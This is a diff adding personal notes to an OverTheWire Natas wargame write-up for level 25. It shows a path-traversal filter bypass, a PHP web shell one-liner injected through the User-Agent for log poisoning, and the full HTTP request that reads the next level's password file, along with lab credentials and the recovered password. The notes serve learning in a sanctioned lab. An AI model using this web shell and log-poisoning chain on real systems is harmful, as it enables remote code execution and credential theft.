@@ -495,3 +495,27 @@ UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo
 This website blocks path traversal from the languege selection.
 I do remember something with the user agent, but I am not going to do it now. I am going to it. Probably poison the log by changing the user agent to /etc/natas_webpass/natas26 or something.
 
+/?lang=....//logs/natas25_srjojurrnasl91j7q63c9fo6dt.log
+
+`<?php system($_GET['cmd']); ?>`
+
+request:
+GET /?lang=....//logs/natas25_srjojurrnasl91j7q63c9fo6dt.log&cmd=cat%20/etc/natas_webpass/natas26 HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyNTpVSkVGNU9BSEYxZVczbHFrcGRDRE03b3c0c3l6aDRvbw==
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 <?php system($_GET['cmd']); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=srjojurrnasl91j7q63c9fo6dt
+Connection: keep-alive
+
+3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
+
+bruh. tough level. I should keep in mind that RCE backdoor cmd thingie. Windows Defender marked this line as a virus lol
+
+I use chat for syntax. I did understand the exploit, just I didnt remember the exact syntex to do it.
+
+###### natas26
+
